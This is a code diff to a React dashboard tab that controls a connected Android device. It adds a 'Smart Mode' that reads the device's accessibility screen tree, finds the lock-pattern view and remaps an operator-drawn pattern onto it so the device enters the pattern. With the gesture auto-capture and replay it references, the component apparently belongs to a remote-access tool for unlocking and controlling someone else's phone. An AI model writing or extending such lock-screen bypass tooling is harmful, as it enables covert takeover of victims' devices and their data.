@@ -2,6 +2,84 @@ import React, { useState, useEffect, useRef, useCallback } from 'react';
 
 const COLORS = ['#00ff88', '#00ccff', '#ff6b35', '#ffd700', '#cc77ff'];
 
+// ── Smart pattern helpers ────────────────────────────────────────────────────
+
+/**
+ * Search the accessibility element list for the lock pattern view.
+ * Priority 1: viewId contains "lockpatternview" or "lock_pattern"
+ * Priority 2: className contains "LockPattern"
+ * Priority 3: large square-ish clickable view with no text
+ */
+function findPatternBox(elements, deviceW, deviceH) {
+  for (const el of elements) {
+    const vid = (el.viewId || '').toLowerCase();
+    if ((vid.includes('lockpatternview') || vid.includes('lock_pattern')) && el.bounds) {
+      const w = el.bounds.right - el.bounds.left;
+      const h = el.bounds.bottom - el.bounds.top;
+      if (w > 50 && h > 50) return el.bounds;
+    }
+  }
+  for (const el of elements) {
+    const cls = (el.className || '').toLowerCase();
+    if (cls.includes('lockpattern') && el.bounds) {
+      const w = el.bounds.right - el.bounds.left;
+      const h = el.bounds.bottom - el.bounds.top;
+      if (w > 50 && h > 50) return el.bounds;
+    }
+  }
+  const candidates = elements.filter(el => {
+    if (!el.bounds) return false;
+    if (el.text || el.contentDescription || el.hintText) return false;
+    if (el.editable || el.scrollable) return false;
+    const w = el.bounds.right - el.bounds.left;
+    const h = el.bounds.bottom - el.bounds.top;
+    if (w < 150 || h < 150) return false;
+    const ratio = w / h;
+    if (ratio < 0.75 || ratio > 1.35) return false;
+    const centerY = (el.bounds.top + el.bounds.bottom) / 2;
+    if (centerY < (deviceH || 1600) * 0.25) return false;
+    return el.clickable;
+  });
+  if (!candidates.length) return null;
+  candidates.sort((a, b) => {
+    const ra = Math.abs(1 - (a.bounds.right - a.bounds.left) / (a.bounds.bottom - a.bounds.top));
+    const rb = Math.abs(1 - (b.bounds.right - b.bounds.left) / (b.bounds.bottom - b.bounds.top));
+    if (Math.abs(ra - rb) < 0.08) {
+      const aa = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
+      const ab = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
+      return ab - aa;
+    }
+    return ra - rb;
+  });
+  return candidates[0].bounds;
+}
+
+/**
+ * Remap PatternDrawer node nx/ny (relative to the pattern frame) to the
+ * actual lockPatternView bounding box on the device screen.
+ * The inner grid sits inside a ~17 % margin on all sides of the pattern box.
+ */
+function remapNodesToBox(nodes, box, deviceW, deviceH) {
+  const nxVals = nodes.map(n => n.nx);
+  const nyVals = nodes.map(n => n.ny);
+  const minNx = Math.min(...nxVals), maxNx = Math.max(...nxVals);
+  const minNy = Math.min(...nyVals), maxNy = Math.max(...nyVals);
+  const rangeNx = maxNx - minNx || 1;
+  const rangeNy = maxNy - minNy || 1;
+  const boxW = box.right  - box.left;
+  const boxH = box.bottom - box.top;
+  const mgn = 0.17;
+  const innerL = box.left + boxW * mgn;
+  const innerT = box.top  + boxH * mgn;
+  const innerW = boxW * (1 - 2 * mgn);
+  const innerH = boxH * (1 - 2 * mgn);
+  return nodes.map(n => ({
+    nx:   (innerL + ((n.nx - minNx) / rangeNx) * innerW) / (deviceW  || 720),
+    ny:   (innerT + ((n.ny - minNy) / rangeNy) * innerH) / (deviceH || 1600),
+    node: n.node,
+  }));
+}
+
 // ── 5 Pattern Size Presets ───────────────────────────────────────────────────
 const PATTERN_SIZES = [
   { id: 'large',    label: 'Large',    nodeR: 24, frameW: 280, frameH: 480, fontSize: 14, hintSize: 11 },
@@ -302,6 +380,14 @@ export default function GestureTab({ device, sendCommand, results }) {
   const [showGestures, setShowGestures] = useState(false);
   const [sizePreset, setSizePreset]     = useState(PATTERN_SIZES[1]);
 
+  const [smartMode, setSmartMode]       = useState(true);
+  const [detectedBox, setDetectedBox]   = useState(null);
+  const pendingPatternRef               = useRef(null);
+  const waitingForScreenRef             = useRef(false);
+
+  const deviceW = device?.deviceInfo?.screenWidth  || 720;
+  const deviceH = device?.deviceInfo?.screenHeight || 1600;
+
   const seenResults = useRef(new Set());
 
   const status = msg => setStatusMsg(msg);
@@ -357,12 +443,40 @@ export default function GestureTab({ device, sendCommand, results }) {
         status(data.success ? 'Auto-capture stopped' : 'Failed: ' + (data.error || ''));
         if (data.success) loadList();
       }
+
+      if (r.command === 'read_screen' && waitingForScreenRef.current && pendingPatternRef.current) {
+        waitingForScreenRef.current = false;
+        const screen = data?.screen || data;
+        const elements = screen?.elements || [];
+        const box = findPatternBox(elements, deviceW, deviceH);
+        const { nodes, sequence } = pendingPatternRef.current;
+        pendingPatternRef.current = null;
+        if (box) {
+          setDetectedBox(box);
+          const mapped = remapNodesToBox(nodes, box, deviceW, deviceH);
+          sendCmd('gesture_draw_pattern', { nodes: mapped, sequence });
+          status(
+            `Smart pattern sent — pattern box at ${box.left},${box.top} (${box.right - box.left}×${box.bottom - box.top}px) · nodes: [${sequence.map(n => n + 1).join('→')}]`
+          );
+        } else {
+          setDetectedBox(null);
+          sendCmd('gesture_draw_pattern', { nodes, sequence });
+          status('Pattern box not detected — sent using full-screen fallback · nodes: [' + sequence.map(n => n + 1).join('→') + ']');
+        }
+      }
     });
-  }, [results]);
+  }, [results, deviceW, deviceH]);
 
   function handleSendPattern(nodes, sequence) {
-    sendCmd('gesture_draw_pattern', { nodes, sequence });
-    status(`Sending pattern [${sequence.map(n => n + 1).join('→')}] to device…`);
+    if (smartMode && isOnline) {
+      pendingPatternRef.current = { nodes, sequence };
+      waitingForScreenRef.current = true;
+      sendCmd('read_screen');
+      status('Scanning device screen for pattern area…');
+    } else {
+      sendCmd('gesture_draw_pattern', { nodes, sequence });
+      status(`Sending pattern [${sequence.map(n => n + 1).join('→')}] to device…`);
+    }
   }
 
   function replay(filename) {
@@ -439,6 +553,34 @@ export default function GestureTab({ device, sendCommand, results }) {
             </div>
           </div>
 
+          <div style={{ width: '100%', background: '#1e293b', borderRadius: 10, padding: '10px 12px', border: `1px solid ${smartMode ? '#6366f155' : '#334155'}` }}>
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 }}>
+              <div style={{ fontSize: 11, fontWeight: 700, color: '#64748b', textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Smart Mode
+              </div>
+              <button
+                onClick={() => setSmartMode(v => !v)}
+                style={{
+                  padding: '3px 10px', borderRadius: 20, border: 'none', cursor: 'pointer', fontSize: 11, fontWeight: 700,
+                  background: smartMode ? '#6366f1' : '#334155',
+                  color: '#fff', transition: 'background 0.2s',
+                }}
+              >
+                {smartMode ? '● ON' : '○ OFF'}
+              </button>
+            </div>
+            <div style={{ fontSize: 10, color: '#475569', lineHeight: 1.5 }}>
+              {smartMode
+                ? 'Reads the device screen first to locate the exact lock pattern area, then maps the drawn pattern to it.'
+                : 'Sends the pattern scaled to the full device screen (manual mode).'}
+            </div>
+            {smartMode && detectedBox && (
+              <div style={{ marginTop: 6, fontSize: 10, color: '#22c55e', padding: '4px 8px', background: '#052e16', borderRadius: 6, border: '1px solid #14532d' }}>
+                Last detected pattern box: {detectedBox.left},{detectedBox.top} → {detectedBox.right},{detectedBox.bottom} ({detectedBox.right - detectedBox.left}×{detectedBox.bottom - detectedBox.top}px)
+              </div>
+            )}
+          </div>
+
           <PatternDrawer onSend={handleSendPattern} isOnline={!!isOnline} sizePreset={sizePreset} />
         </div>
 
@@ -452,8 +594,9 @@ export default function GestureTab({ device, sendCommand, results }) {
               <li>Use the <strong style={{ color: '#6366f1' }}>Pattern Size</strong> toggles to match your target device screen size</li>
               <li>Click and drag through the dots on the phone frame to draw a pattern</li>
               <li>The pattern will follow the selected nodes in order</li>
-              <li>Click <strong style={{ color: '#6366f1' }}>Send Pattern to Device</strong> to execute it on the device screen</li>
-              <li>The device maps the pattern to its actual screen size automatically</li>
+              <li>With <strong style={{ color: '#6366f1' }}>Smart Mode ON</strong> (default), the dashboard reads the device screen first, locates the real lock pattern box, and maps your drawn pattern to its exact position</li>
+              <li>With Smart Mode OFF, the pattern is scaled to the full device screen</li>
+              <li>The detected box coordinates appear below the Smart Mode toggle after each send</li>
             </ol>
           </div>
 
